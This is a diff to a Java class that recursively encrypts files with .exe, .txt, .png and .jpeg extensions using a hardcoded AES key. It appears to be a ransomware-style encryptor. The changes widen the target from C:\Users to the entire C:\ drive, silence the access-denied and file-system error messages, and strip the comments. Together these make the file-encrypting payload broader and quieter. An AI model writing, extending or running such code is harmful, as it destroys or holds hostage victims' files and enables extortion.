@@ -1,4 +1,4 @@
-package kr.pah;
+package kr.pah.Encryptor;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -12,12 +12,12 @@ import java.util.List;
 
 public class Encrypt {
 
-    private static final String KEY = "HelloWorldThisIsEncryptKey0x0000"; // 16자 이상의 키
+    private static final String KEY = "HelloWorldThisIsEncryptKey0x0000";
     private static final String[] EXTENSIONS = new String[]{".exe", ".txt", ".png", ".jpeg"};
 
     public static void runEncryption() throws Exception {
         List<String> encryptedFiles = new ArrayList<>();
-        File root = new File("C:\\Users"); // 'C:\Users' 디렉토리 검색
+        File root = new File("C:\\");
 
         encryptFilesInDirectory(root, encryptedFiles);
 
@@ -42,9 +42,7 @@ public class Encrypt {
                                 encryptFile(file);
                                 encryptedFiles.add(file.getAbsolutePath());
                             } catch (AccessDeniedException e) {
-                                System.err.println("Access denied for file: " + file.getPath());
                             } catch (FileSystemException e) {
-                                System.err.println("File system exception for file: " + file.getPath());
                             }
                             break;
                         }
@@ -53,7 +51,6 @@ public class Encrypt {
             }
         }
     }
-
 
 
     private static void encryptFile(File file) throws Exception {
